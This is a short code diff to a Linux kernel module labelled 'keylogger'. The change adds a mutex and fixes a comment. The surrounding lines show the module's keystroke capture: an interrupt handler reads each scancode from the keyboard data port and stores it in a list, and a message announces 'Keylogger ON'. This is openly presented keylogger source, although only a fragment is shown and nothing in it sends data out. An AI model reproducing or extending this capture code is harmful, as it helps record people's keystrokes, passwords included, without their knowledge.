@@ -4,7 +4,8 @@ MODULE_AUTHOR("SegFault42 <SegFault42@protonmail.com>");
 MODULE_DESCRIPTION("keylogger");
 MODULE_LICENSE("GPL");
 
-extern t_key	*first;
+extern t_key			*first;
+struct mutex			lock;
 
 static irqreturn_t	keyboard(int irq, void *dev_id)
 {
@@ -12,7 +13,7 @@ static irqreturn_t	keyboard(int irq, void *dev_id)
 
 	scancode = inb(KBD_DATA_REG);
 
-	// check if valid entry
+	// check if is valid entry
 	if (strlen(key_name[scancode]) != 0)
 		add_tail(scancode);
 
@@ -22,6 +23,9 @@ static irqreturn_t	keyboard(int irq, void *dev_id)
 static int __init	keyboard_init(void)
 {
 	pr_info("Keylogger ON\n");
+
+	//init mutex
+	mutex_init(&lock);
 
 	create_misc();
 
